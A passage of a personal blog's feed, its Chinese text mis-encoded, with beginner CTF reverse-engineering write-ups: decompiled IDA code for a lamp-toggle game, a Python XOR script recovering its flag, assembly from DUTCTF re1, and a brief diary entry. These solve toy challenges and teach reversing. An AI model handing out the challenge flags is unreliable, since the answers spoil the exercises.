        <content type="html"><![CDATA[<blockquote><p><a href="game.exe">è¿™é“é¢˜</a>æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå°æ¸¸æˆï¼Œå°±æ˜¯ä¸€ä¸ªä¸€ç»´çš„å¼€å…³ç¯æ¸¸æˆï¼Œç‚¹äº®ä¸€ç›ç¯ï¼Œå®ƒå‰åçš„ä¸¤ç›ç¯å°±ä¼šæ”¹å˜çŠ¶æ€ã€‚è¿™é“é¢˜ç¬¬ä¸€æ¬¡åšæˆ‘æ˜¯ç©é€šå…³äº†æ‹¿åˆ°flagçš„ã€‚ã€‚ã€‚<br>ç©é€šå…³çš„æ–¹æ³•å°±æ˜¯æŒ‰é¡ºåºè¾“å…¥ä¸€åœˆâ€¦â€¦</p></blockquote><p>IDAè¿›å…¥mainï¼Œçœ‹æ±‡ç¼–æ„Ÿè§‰å¤ªä¹±äº†ï¼Œç›´æ¥åç¼–è¯‘çœ‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">main_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_45A7BE(&amp;unk_50B110);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B158);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B1A0);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B1E8);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B230);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B278);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B2C0);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B308);</span><br><span class="line">  sub_45A7BE(<span class="string">"äºŒ                                                     |\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"|              by 0x61                                 |\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"|                                                      |\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"|------------------------------------------------------|\n"</span>);</span><br><span class="line">  sub_45A7BE(</span><br><span class="line">    <span class="string">"Play a game\n"</span></span><br><span class="line">    <span class="string">"The n is the serial number of the lamp,and m is the state of the lamp\n"</span></span><br><span class="line">    <span class="string">"If m of the Nth lamp is 1,it's on ,if not it's off\n"</span></span><br><span class="line">    <span class="string">"At first all the lights were closed\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"Now you can input n to change its state\n"</span>);</span><br><span class="line">  sub_45A7BE(</span><br><span class="line">    <span class="string">"But you should pay attention to one thing,if you change the state of the Nth lamp,the state of (N-1)th and (N+1)th w"</span></span><br><span class="line">    <span class="string">"ill be changed too\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"When all lamps are on,flag will appear\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"Now,input n \n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_45A7BE(<span class="string">"input n,n(1-8)\n"</span>);</span><br><span class="line">      sub_459418();</span><br><span class="line">      sub_45A7BE(<span class="string">"n="</span>);</span><br><span class="line">      sub_4596D4(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">      sub_45A7BE(<span class="string">"\n"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_45A7BE(<span class="string">"sorry,n error,try again\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4576D6(v1 - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i &gt;= <span class="number">9</span> )</span><br><span class="line">          j____report_rangecheckfailure();</span><br><span class="line">        byte_532E28[i] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    j__system(<span class="string">"CLS"</span>);</span><br><span class="line">    sub_458054();</span><br><span class="line">    <span class="keyword">if</span> ( byte_532E28[<span class="number">0</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">1</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">2</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">3</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">4</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">5</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">6</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">7</span>] == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_457AB4();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“çœ‹å‡ºæ¥sub_457AB4()è¿™ä¸ªåº”è¯¥æ˜¯ç¯å…¨éƒ¨ç‚¹äº®ï¼Œç¬¦åˆé€šå…³æ¡ä»¶ä¹‹åæ‰“å°flagçš„å‡½æ•°ã€‚<br>IDAè·Ÿè¿›å»ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_457AB4</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_45E940();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†è·Ÿè¿›ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ä¸Šé¢æ˜¯ä¸€å¨æ•°æ®ï¼Œçœç•¥ä¸å¤åˆ¶äº†*/</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">56</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;v2 + i) ^= *(&amp;v59 + i);</span><br><span class="line">    *(&amp;v2 + i) ^= <span class="number">0x13</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_45A7BE(<span class="string">"%s\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¾ˆæ¸…æ¥šåœ°çœ‹åˆ°flagæ˜¯é€šè¿‡ç®€å•çš„ä¸¤æ­¥å¼‚æˆ–è®¡ç®—å‡ºæ¥çš„ï¼Œå¼‚æˆ–çš„å¯†é’¥å’Œå¯†æ–‡éƒ½åœ¨è¿™ä¸ªå‡½æ•°é‡Œäº†ï¼Œäºæ˜¯å†™è„šæœ¬ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor=[<span class="number">18</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">65</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">48</span>,<span class="number">65</span>,<span class="number">31</span>,<span class="number">78</span>,<span class="number">62</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">57</span>,<span class="number">96</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">44</span>,<span class="number">65</span>,<span class="number">78</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">16</span>,<span class="number">44</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">89</span>,<span class="number">45</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">15</span>,<span class="number">34</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">0</span>]</span><br><span class="line">key=[<span class="number">123</span>, <span class="number">32</span>, <span class="number">18</span>, <span class="number">98</span>, <span class="number">119</span>, <span class="number">108</span>, <span class="number">65</span>, <span class="number">41</span>, <span class="number">124</span>, <span class="number">80</span>, <span class="number">125</span>, <span class="number">38</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">74</span>, <span class="number">49</span>, <span class="number">83</span>, <span class="number">108</span>, <span class="number">94</span>, <span class="number">108</span>, <span class="number">84</span>, <span class="number">6</span>, <span class="number">96</span>, <span class="number">83</span>, <span class="number">44</span>, <span class="number">121</span>, <span class="number">104</span>, <span class="number">110</span>, <span class="number">32</span>, <span class="number">95</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">123</span>, <span class="number">127</span>, <span class="number">119</span>, <span class="number">96</span>, <span class="number">48</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">92</span>, <span class="number">29</span>, <span class="number">81</span>, <span class="number">107</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">64</span>, <span class="number">12</span>, <span class="number">43</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">13</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">117</span>, <span class="number">126</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">    a = key[i]</span><br><span class="line">    a ^= <span class="number">0x13</span></span><br><span class="line">    a ^= xor[i]</span><br><span class="line">    flag += chr(a)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>è·‘ä¸€ä¸‹å°±okäº†ã€‚</p><p>å°çŸ¥è¯†ç‚¹ï¼š</p><p>int sprintf( char <em>buffer, const char </em>format, [ argument] â€¦ );</p><p>å‚æ•°åˆ—è¡¨</p><ul><li>bufferï¼šcharå‹æŒ‡é’ˆï¼ŒæŒ‡å‘å°†è¦å†™å…¥çš„å­—ç¬¦ä¸²çš„ç¼“å†²åŒºã€‚</li><li>formatï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚</li><li>[argument]â€¦ï¼šå¯é€‰å‚æ•°ï¼Œå¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„æ•°æ®ã€‚</li></ul><p>extern char <em>strcat(char </em>dest, const char *src);</p><ul><li>æŠŠsrcæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬â€œ\0â€ï¼‰å¤åˆ¶åˆ°destæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²åé¢ï¼ˆåˆ é™¤*deståŸæ¥æœ«å°¾çš„â€œ\0â€ï¼‰ã€‚è¦ä¿è¯*destè¶³å¤Ÿé•¿ï¼Œä»¥å®¹çº³è¢«å¤åˆ¶è¿›æ¥çš„*srcã€‚*srcä¸­åŸæœ‰çš„å­—ç¬¦ä¸å˜ã€‚è¿”å›æŒ‡å‘destçš„æŒ‡é’ˆã€‚</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DUTCTF re1</title>
      <link href="/2019/04/28/DUTCTF-re1/"/>
      <url>/2019/04/28/DUTCTF-re1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æŠŠä»¥å‰åšè¿‡çš„<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">æ”»é˜²ä¸–ç•Œ</a>ä¸Šçš„é¢˜æ•´ç†ä¸€ä¸‹ã€‚<br><a href="re1.exe">é¢˜ç›®æ–‡ä»¶ä¹Ÿä¸€å¹¶ä¸Šä¼ äº†ã€‚</a><br>åšé€†å‘æ²¡ä»€ä¹ˆç»éªŒï¼Œæ‰€ä»¥æœ‰äº›æ€è·¯ä¸Šçš„æ··ä¹±è¿˜è¯·æŒ‡å‡ºï¼ˆè¯„è®ºåŠŸèƒ½å¾…æ–½å·¥ï¼‰ã€‚</p></blockquote><p>IDAçœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00401000</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401001</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401003</span>                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">44h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401006</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> ___security_cookie</span><br><span class="line"><span class="symbol">.text:</span>0040100B                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040100D</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401010</span>                 <span class="keyword">movdqu</span>  <span class="built_in">xmm0</span>, <span class="built_in">ds</span>:xmmword_413E34</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401018</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0040101A                 <span class="keyword">push</span>    offset aDutctf  <span class="comment">; "æ¬¢è¿æ¥åˆ°DUTCTFå‘¦\n"</span></span><br><span class="line"><span class="symbol">.text:</span>0040101F                 <span class="keyword">movdqu</span>  [<span class="built_in">ebp</span>+var_44], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401024</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_2C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401027</span>                 <span class="keyword">movq</span>    <span class="built_in">xmm0</span>, <span class="built_in">ds</span>:qword_413E44</span><br><span class="line"><span class="symbol">.text:</span>0040102F                 <span class="keyword">movq</span>    [<span class="built_in">ebp</span>+var_34], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401034</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_28], <span class="built_in">ax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401038</span>                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040103D</span>                 <span class="keyword">push</span>    offset asc_413E60 <span class="comment">; "è¿™æ˜¯ä¸€é“å¾ˆå¯çˆ±å¾ˆç®€å•çš„é€†å‘é¢˜å‘¦\n"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401042</span>                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401047</span>                 <span class="keyword">push</span>    offset aFlag    <span class="comment">; "è¾“å…¥flagå§:"</span></span><br><span class="line"><span class="symbol">.text:</span>0040104C                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401051</span>                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_24]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401054</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401055</span>                 <span class="keyword">push</span>    offset aS       <span class="comment">; "%s"</span></span><br><span class="line"><span class="symbol">.text:</span>0040105A                 <span class="keyword">call</span>    _scanf</span><br><span class="line"><span class="symbol">.text:</span>0040105F                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">14h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401062</span>                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_24]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401065</span>                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_44]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401068</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401068</span> loc_401068:                             <span class="comment">; CODE XREF: _main+82â†“j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401068</span>                 <span class="keyword">mov</span>     <span class="built_in">dl</span>, [<span class="built_in">ecx</span>]</span><br><span class="line"><span class="symbol">.text:</span>0040106A                 <span class="keyword">cmp</span>     <span class="built_in">dl</span>, [<span class="built_in">eax</span>]</span><br><span class="line"><span class="symbol">.text:</span>0040106C                 <span class="keyword">jnz</span>     short loc_401088</span><br><span class="line"><span class="symbol">.text:</span>0040106E                 <span class="keyword">test</span>    <span class="built_in">dl</span>, <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401070</span>                 <span class="keyword">jz</span>      short loc_401084</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401072</span>                 <span class="keyword">mov</span>     <span class="built_in">dl</span>, [<span class="built_in">ecx</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401075</span>                 <span class="keyword">cmp</span>     <span class="built_in">dl</span>, [<span class="built_in">eax</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401078</span>                 <span class="keyword">jnz</span>     short loc_401088</span><br><span class="line"><span class="symbol">.text:</span>0040107A                 <span class="keyword">add</span>     <span class="built_in">ecx</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040107D</span>                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401080</span>                 <span class="keyword">test</span>    <span class="built_in">dl</span>, <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401082</span>                 <span class="keyword">jnz</span>     short loc_401068</span><br></pre></td></tr></table></figure><p>åœ¨401010å¤„å¯ä»¥çœ‹åˆ°æœ‰ä¸ªmovdquæŒ‡ä»¤ï¼Œç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªæŒ‡ä»¤æ˜¯ç”¨æ¥åœ¨æœªå¯¹é½çš„å†…å­˜ä½ç½®ä¸­ç§»å…¥/ç§»å‡ºåŒå››å­—ï¼Œxmm0è¿™ä¸ªå¯„å­˜å™¨ä¹Ÿæ²¡æ¥è§¦è¿‡ï¼Œç™¾åº¦ä¸€ä¸‹äº†è§£äº†XMMå¯„å­˜å™¨æ˜¯8ä¸ª128ä½ç‹¬ç«‹å¯„å­˜å™¨ã€‚åŒå‡»æŸ¥çœ‹å†…å®¹å¯ä»¥çœ‹åˆ°è¿™ä¸ªå°±æ˜¯flagäº†ã€‚ä¹Ÿå°±æ˜¯è¿™ä¸ªç¨‹åºåˆå§‹åŒ–å˜é‡çš„æ—¶å€™ç›´æ¥æŠŠflagé‚£ä¸ªå˜é‡èµ‹å€¼äº†ï¼Œæœç„¶æ˜¯å¾ˆç®€å•çš„é€†å‘é¢˜â€¦â€¦</p><p>åç¼–è¯‘éªŒè¯ä¸€ä¸‹æ¨æµ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int128 v5; <span class="comment">// [esp+0h] [ebp-44h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [esp+10h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+18h] [ebp-2Ch]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [esp+1Ch] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+20h] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  _mm_storeu_si128((__m128i *)&amp;v5, _mm_loadu_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_413E34));</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = qword_413E44;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"æ¬¢è¿æ¥åˆ°DUTCTFå‘¦\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"è¿™æ˜¯ä¸€é“å¾ˆå¯çˆ±å¾ˆç®€å•çš„é€†å‘é¢˜å‘¦\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"è¾“å…¥flagå§:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v9);</span><br><span class="line">  v3 = <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5, &amp;v9);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    v3 = -(v3 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">printf</span>(aFlag_0);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_413E90);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œv6å°±æ˜¯flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190427</title>
      <link href="/2019/04/27/20190427/"/>
      <url>/2019/04/27/20190427/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æ‹‰ç€åŒå­¦å’Œä¸¤ä½å­¦é•¿é™ªåä¸ºæ­ç ”æ‰€çš„é¢è¯•å®˜åƒäº†é¡¿é¥­ï¼ŒæœŸé—´è¯´äº†å¾ˆå¤šæœ‰ç”¨çš„ä¸œè¥¿ï¼Œè€Œä¸”æ˜å¤©ä¸å‡ºæ„å¤–çš„è¯ä»–å°±æ˜¯å­¦é•¿çš„é¢è¯•å®˜2333ã€‚</p><p>å¸­é—´ä¹Ÿé—®äº†ä¸€ä¸‹å…³äº996çš„äº‹æƒ…ï¼Œé¢è¯•å®˜æ²¡æœ‰ç›´æ¥å›ç­”ï¼Œè€Œæ˜¯è¯´ä¸ä¼šç»å¸¸é€šå®µ23333ã€‚</p><p>åˆæ²¡å­¦ä¹ é€†å‘ï¼Œæ˜å¤©å†™ä¸€äº›æ”»é˜²ä¸–ç•Œçš„WPï¼Œæ”»é˜²ä¸–ç•Œæ‰¾çš„å„ä¸ªCTFçš„é¢˜è¿˜æ˜¯æŒºé€‚åˆå…¥é—¨çš„ï¼Œè€Œä¸”æ”»é˜²ä¸–ç•Œå‰ä¸€é˜µæœ‰æ›´æ–°ï¼Œè¿˜æ²¡ä½“éªŒè¿‡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¹±ä¸ƒå…«ç³Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190426</title>
      <link href="/2019/04/26/20190426/"/>
      <url>/2019/04/26/20190426/</url>
      
